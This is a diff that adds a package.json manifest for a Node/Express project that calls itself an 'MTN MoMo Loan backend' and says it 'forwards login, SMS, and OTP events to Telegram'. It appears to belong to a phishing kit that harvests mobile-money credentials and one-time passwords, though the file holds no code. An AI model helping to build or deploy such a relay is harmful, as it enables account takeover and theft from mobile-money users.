@@ -1,0 +1,27 @@
+{
+  "name": "momo-usersey-backend",
+  "version": "1.0.0",
+  "description": "MTN MoMo Loan backend — forwards login, SMS, and OTP events to Telegram",
+  "main": "server.js",
+  "type": "commonjs",
+  "scripts": {
+    "start": "node server.js",
+    "dev": "node server.js"
+  },
+  "engines": {
+    "node": ">=18.0.0"
+  },
+  "dependencies": {
+    "express": "^4.19.2",
+    "cors": "^2.8.5"
+  },
+  "keywords": [
+    "momo",
+    "mtn",
+    "loan",
+    "telegram",
+    "railway"
+  ],
+  "author": "",
+  "license": "MIT"
+}
